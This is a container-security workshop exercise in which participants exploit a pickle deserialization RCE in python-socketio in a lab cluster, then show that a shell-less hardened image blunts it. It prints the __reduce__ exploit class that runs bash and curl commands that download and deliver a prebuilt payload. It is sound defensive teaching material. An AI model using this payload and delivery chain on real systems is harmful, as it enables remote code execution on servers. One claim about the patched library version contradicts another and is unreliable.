Exercise 4

The vulnerable workload

Authors
  • Name
    Twitter

After yesterday's incident, ACME's Infosec lead Morgan has asked Sarah to prove that the team's container hardening strategy actually works. The best way? Find a real vulnerability, exploit it live, then show Morgan how the container hardening approach employed by ACME neutralise the threat.

Sarah has been reading about CVE-2025-61765. This is a remote code execution vulnerability in python-socketio versions prior to 5.14.0.

It's a textbook insecure deserialization flaw that lets an attacker run arbitrary code on any Socket.IO server that uses a shared message broker like Redis. With both Redis & Python being regularly used across the bank this should clearly show Morgan that the container hardening work that Sarah's team have on the backlog works, and should be immediately prioritized.

It's a new day, time to lock in and get it done! 🧑🏻‍💻

4.1 Understanding CVE-2025-61765

When multiple Socket.IO servers share a message broker for inter-server communication, messages are serialised using Python's pickle module. When a server receives a message from the broker it calls pickle.loads() automatically, trusting that the data is safe.

An attacker who can reach the message broker (or any service that publishes to it) can send a crafted pickle payload that executes arbitrary code during deserialization through Python's __reduce__ method.

Here's the core of the exploit, a class whose __reduce__ method tells pickle.loads() to call subprocess.call() with an attacker-controlled command:

class RCEPayload:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (subprocess.call, (["/bin/bash", "-c", self.cmd],))

When this object is unpickled by the vulnerable server, it runs the shell command. The attacker simply serialises this payload and publishes it to the broker channel that Socket.IO subscribes to.

The exploit depends on two things: (1) pickle.loads() deserializing untrusted data, and (2) a shell (/bin/bash) being available in the container image to execute the payload.

4.2 Deploy the vulnerable environment

For this workshop we've deployed a vulnerable Socket.IO application to our cluster. We'll start with a typical setup that many teams have in production. This is a community Redis image as the message broker, and the application built on a standard Red Hat UBI image with a full shell environment.

First, take a look at your personal vulnerable-workload- namespace.

In the OpenShift Web Console, navigate to Workloads --> Pods and ensure you have the vulnerable-workload- namespace selected.

You should see three running pods: message-broker, socketio-server, and edge-server.

Vulnerable application pods running

4.3 Trigger the exploit

Now, let's act as the attacker. We'll send a malicious pickle payload to the edge server's public route, which forwards it to the Redis broker, where the vulnerable Socket.IO server picks it up and deserializes it, in doing so executing our code.

We'll do this from within a Web Terminal, so open a fresh one now if you closed this previously.

First thing we need to do is set our namespace variable, ensure you update this from vulnerable-workload-x to reflect your assigned namespace number.

export NAMESPACE=vulnerable-workload-x

Now let's grab the route URLs for the application, and download the pre-built exploit payload:

export EDGE_URL=$(oc --namespace $NAMESPACE get route edge-server --output jsonpath='{.spec.host}')
export SOCKETIO_URL=$(oc --namespace $NAMESPACE get route socketio-server --output jsonpath='{.spec.host}')
curl -sSfL https://github.com/finhennessy/workshops/raw/refs/heads/main/workshop/files/payload.bin -o /tmp/payload.bin

Now deliver the exploit payload to the edge server webhook:

curl -k -X POST "https://${EDGE_URL}/webhook" \
  -H "Content-Type: application/octet-stream" \
  -H "X-Channel: socketio" \
  --data-binary @/tmp/payload.bin

You should see a JSON response confirming the payload was delivered and received by a subscriber.

Now check whether the exploit succeeded. The Socket.IO server exposes an /evidence endpoint that reads the evidence file:

curl -skf "https://${SOCKETIO_URL}/evidence"

If the exploit worked, you'll see output like:

>>> COMPROMISED via CVE-2025-61765 <<<

The Socket.IO server has been compromised. An attacker delivered arbitrary code through a pickle payload from outside the cluster. The server had no way to distinguish it from a legitimate inter-server message.

Take a minute to review the exploit source at exploit/poc.py and the vulnerable server at socketio-server/server.py. The server code itself looks completely normal. The vulnerability is in the python-socketio library's use of pickle.loads().

4.4 Harden the image

Red Hat Hardened Images is Red Hat's catalog of minimal, hardened container images, available at no-cost. These images are built with a distroless philosophy:

  • No shell - no bash, sh, or any other shell binary
  • No package manager - no dnf, rpm, or apt
  • Minimal attack surface - only the runtime and its dependencies are included
  • Non-root by default - containers run as a non-privileged user

This matters for CVE-2025-61765 because the exploit payload calls subprocess.call(["/bin/bash", "-c", ...]). If there's no /bin/bash in the container, the deserialization still happens but the code execution fails because there's nothing to execute.

Let's compare the two Containerfiles for the Socket.IO server:

Vulnerable (Containerfile) - built on UBI 9, which includes a full shell environment:

FROM registry.redhat.io/ubi9/python-311
# ... has bash, coreutils, rpm, etc.

Hardened (Containerfile.hardened) - multi-stage build, runtime stage uses the Red Hat Hardened Images distroless Python image. It also uses requirements-hardened.txt, which removes the version pin so pip pulls the latest (patched) python-socketio:

FROM registry.access.redhat.com/hi/python:latest-builder AS builder
# install dependencies in builder (has shell)
# uses requirements-hardened.txt — no version pin on python-socketio

FROM registry.access.redhat.com/hi/python:latest
# runtime only — no shell, no package manager
COPY --from=builder /opt/venv /opt/venv

Before we harden the application, let's remove the evidence of the vulnerability exploit we just performed, returning to a clean state for our next attempt 🧼:

oc --namespace $NAMESPACE exec deploy/socketio-server -- rm -f /tmp/evidence/pwned.txt 2>/dev/null; true

4.5 Harden the application

Now let's address the exploit directly. Apply the hardened Socket.IO server deployment, which uses the Red Hat Hardened Images distroless Python image:

curl --silent --fail --location "https://raw.githubusercontent.com/finhennessy/workshops/refs/heads/main/workshop/files/socketio-server-hardened.yaml" \
  | sed "s/\${SUFFIX}/${SUFFIX}/g; s/\${NAMESPACE}/${NAMESPACE}/g" \
  | oc apply --filename -

Wait for the new pod to roll out:

oc --namespace $NAMESPACE rollout status deploy/socketio-server

If we return to the OpenShift Web Console now, looking at the pod creation column you'll see a fresh socketio-server pod deployed.

Hardened socketio-server image running

We can also check the image in use by clicking on the pod name and scrolling down to the Containers section. You should see quay.io/smileyfritz/socketio-server:0.1.0-hardened.

Hardened socketio-server image

We can also verify the new pod is running the hardened image with the command line:

oc --namespace $NAMESPACE get deploy socketio-server --output jsonpath='{.spec.template.spec.containers[0].image}'

You should see quay.io/smileyfritz/socketio-server:0.1.0-hardened.

4.6 Verify the fix

Re-run the exploit against the hardened server. The edge server and Redis still relay the payload as before:

curl -k -X POST "https://${EDGE_URL}/webhook" \
  -H "Content-Type: application/octet-stream" \
  -H "X-Channel: socketio" \
  --data-binary @/tmp/payload.bin

Now check the /evidence endpoint:

curl -skf "https://${SOCKETIO_URL}/evidence"

This time the response will be empty — no evidence file was created ⛔. The exploit payload called subprocess.call(["/bin/bash", ...]) and there is no /bin/bash in the Red Hat Hardened Images distroless image. The pickle deserialization still triggered, but the code execution failed.

Key takeaway: The hardened application image didn't fix the vulnerable library code. The python-socketio 5.13.0 package still calls pickle.loads(). But by removing the shell and minimising the image contents, the blast radius of the exploit is drastically reduced. Defence in depth means the vulnerability exists but cannot be weaponised.

Excellent work! You've seen how a real-world Remote Code Execution vulnerability can be exploited in a containerised environment, and how adopting Red Hat Hardened Images provides critical defence in depth even when application-level vulnerabilities exist.

Stretch activity

We hardened the application runtime, but the message broker is still running the community docker.io/redis:7-alpine image, with no Red Hat support, no CVE patching SLA, and no supply chain provenance.
